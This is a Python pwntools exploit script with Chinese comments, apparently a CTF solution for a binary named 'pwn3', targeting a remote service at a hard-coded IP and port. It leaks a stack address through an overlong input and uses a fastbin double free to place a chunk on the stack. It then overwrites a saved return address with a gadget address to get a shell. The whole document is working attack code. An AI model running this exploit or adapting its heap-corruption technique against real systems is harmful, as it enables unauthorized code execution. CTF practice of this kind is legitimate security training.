#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
超过长度的luck number可以泄露栈的地址
第二次控制luck number的数值。利用fastbin double free将chunk分配到栈上

远程的服务比较坑，不知道为什么，一定要输入再长一倍的数字才能把栈地址泄露出来
"""

import sys
from pwn import *

context.log_level = 'debug'

class Operation:
    def __init__(self, io):
        self.io = io
    
    def add(self, idx, size, content):
        self.io.sendlineafter('2 delete paper\n', '1')
        self.io.sendlineafter(':', str(idx))
        self.io.sendlineafter(':', str(size))
        self.io.sendlineafter(':', content)
    
    def delete(self, idx):
        self.io.sendlineafter('2 delete paper\n', '2')
        self.io.sendlineafter(':', str(idx))

    def try_leak_stack(self):
        self.io.sendlineafter('2 delete paper\n', '3')
        self.io.sendafter(':', '@' * 48 * 2)
        self.io.recvuntil('2 delete paper\n')
        self.io.recv(48)
        _ = self.io.recvuntil(' input')
        data = _[:-6]
        if len(data) != 6:
            self.io.recvuntil('number!\n')
            self.io.recv(48)
            _ = self.io.recvuntil(' input')
            data = _[:-6]
            if len(data) != 6:
                # 有时会遇上栈地址中存在00等情况导致地址信息无法完整输出
                # 多试几次就好
                log.error('Cannot get full stack address. Please try again.')
                sys.exit(-1)
        return u64(data.ljust(8, '\x00'))

fn = './pwn3'

if len(sys.argv) == 1:
    io = process(fn)
else:
    io = remote('47.104.16.75', 8999)
    # io = remote('127.0.0.1', 4444)

op = Operation(io)

log.info('input luck number and leak stack address')
stack_addr = op.try_leak_stack()
log.success('stack_addr = %s', hex(stack_addr))
"""
luck number地址为
0x7fff09381ab8
获取的栈地址为
0x7fff09381aa0

0xb8 - 0xa0 = 24
"""
ln_addr = stack_addr + 24
log.success('luck_number_addr = %s', hex(ln_addr))
fake_chunk_addr = ln_addr - 0x8
log.success('fake_chunk_addr = %s', hex(fake_chunk_addr))



log.info('enter secret agin')
io.sendlineafter('number!\n', '5')
io.sendlineafter('2 delete paper\n', '3')
io.sendlineafter(':', str(0x31))  # luck number

# raw_input('w')

l = 0x20

log.info('malloc index 0 size %s', l)
op.add(0, l, '\x00' * (l - 1))

log.info('malloc index 0 size %s', l)
op.add(1, l, '\x00' * (l - 1))

log.info('1st free index 0')
op.delete(0)

log.info('free index 1')
op.delete(1)

log.info('2nd free index 0')
op.delete(0)

# raw_input('w')


log.info('malloc index 1 size %s', l)
op.add(1, l, p64(fake_chunk_addr))

log.info('malloc index 2 size %s', l)
op.add(2, l, p64(fake_chunk_addr))

log.info('malloc index 3 size %s', l)
op.add(3, l, p64(fake_chunk_addr))

# 注意这里不能直接跳入gg的入口地址0x400943，会出错
# 为了保持栈平衡，需要跳过压栈的步骤，所以跳转至0x400947
# 由于远程和本机位置不同，本机只要第四个单元为跳转地址即可
# 但这样远程会报错，原因不明
# 所以将其全部设置为跳转地址，可get shell
log.info('malloc index 4 size %s', l)
op.add(4, l, p64(0x400947) * 4)

# 跳回至main循环。不过栈上保存的main的地址已经被上一步修改……
io.sendlineafter('2 delete paper\n', '3')
io.interactive()
